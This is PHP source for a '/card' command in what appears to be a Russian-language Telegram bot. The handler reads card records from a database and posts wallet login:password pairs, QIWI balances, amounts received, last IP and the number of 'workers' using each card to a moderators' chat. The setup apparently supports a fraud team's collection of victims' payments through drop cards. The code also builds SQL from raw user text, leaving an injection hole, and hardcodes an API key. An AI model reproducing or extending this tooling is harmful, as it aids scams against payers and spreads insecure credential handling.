<?php

	if(preg_match('/\/card (\d{16}|\d{4}\s\d{4}\s\d{4}\s\d{4}|0)/i', $message['text']) == TRUE) {
		$card = str_replace(' ', '', substr($message['text'], 6));
		
		$query = mysqli_query($connection, "SELECT `login`, `password`, `token`, `amount`, `totalAmount`, `number`, `status`, `ip` FROM `cards` WHERE `number` = '$card'");
		
		if(mysqli_num_rows($query) > 0) {
			$card = mysqli_fetch_assoc($query);
			
			require_once $_SERVER['DOCUMENT_ROOT'].'/qiwi/api.php';
			$qiwi = new Qiwi($card['login'], $card['token']);
			
			$amount = floor($qiwi->getBalance()['accounts'][0]['balance']['amount']);
			
			if($card['amount'] < $amount) {
				$totalAmount = ($amount-$card['amount']);
				$card['totalAmount'] = $totalAmount;
			} else {
				$totalAmount = 0;
			}
			
			if($card['status'] == '0') $status = 'Неактивна';
			if($card['status'] == '1') $status = 'Активна';
			
			$workers = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0' AND `card` = '$card[number]'"));
			
			$text = "💳 <b>Информация о карте:</b>\n\n";
			$text .= "Номер карты: <code>$card[number]</code>\n";
			$text .= "Данные для входа: <code>$card[login]:$card[password]</code>\n";
			$text .= "Баланс: <code>$amount руб.</code> | Принято: <code>$card[totalAmount] руб.</code>\n";
			$text .= "Статус: <code>$status</code>\n";
			$text .= "Используют: <code>".Endings($workers, "воркер", "воркера", "воркеров")."</code>\n";
			$text .= "Последний IP: <code>$card[ip]</code>\n";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		} else {
			$bin = substr($message['text'], 6, -10);
			$card = json_decode(curl_get_contents("https://api.cardinfo.online?input=$bin&apiKey=9f46488683ee53ae5b45215f7f566ffa"));

			if(isset($card->{'bankNameLocal'}) OR isset($card->{'country'}) OR isset($card->{'cardType'})) {
				$bankName = $card->{'bankNameLocal'};
				$country = $card->{'country'};
				$cardType = $card->{'brandName'};

				$text = "💳 <b>Информация о карте</b> <code>".substr($message['text'], 6)."</code><b></b>\n\n";
				if(isset($card->bankNameLocal)) $text .= "<b>Банк:</b> <code>$bankName</code>\n";
				if(isset($card->country)) $text .= "<b>Страна:</b> <code>$country</code>\n";
				if(isset($card->cardType)) $text .= "<b>Тип:</b> <code>$cardType</code>\n";

				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			} elseif($bin == '489049' OR $bin == '469395') {
				$text = "💳 <b>Информация о карте</b> <code>".substr($message['text'], 6)."</code><b></b>\n\n";
				$text .= "<b>Банк:</b> <code>QIWI BANK</code>\n";
				$text .= "<b>Страна:</b> <code>RU</code>\n";
				$text .= "<b>Тип:</b> <code>Visa</code>\n";

				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			} elseif($bin == '559900') {
				$text = "💳 <b>Информация о карте</b> <code>".substr($message['text'], 6)."</code><b></b>\n\n";
				$text .= "<b>Банк:</b> <code>YANDEX.MONEY</code>\n";
				$text .= "<b>Страна:</b> <code>RU</code>\n";
				$text .= "<b>Тип:</b> <code>Mastercard</code>\n";
			} else {
				$text = "🥺 <b>Информация о карте не найдена</b>";
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			}
		}
	}

?>